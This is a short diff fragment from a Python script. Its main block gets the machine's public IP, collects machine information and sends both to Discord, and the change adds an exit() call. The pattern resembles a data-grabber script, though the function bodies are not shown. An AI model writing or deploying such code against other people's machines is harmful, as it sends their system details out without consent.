@@ -95,3 +95,4 @@ if __name__ == "__main__":
     public_ip = get_public_ip()
     machine_info = get_machine_info()
     send_to_discord(machine_info, public_ip)
+    exit()
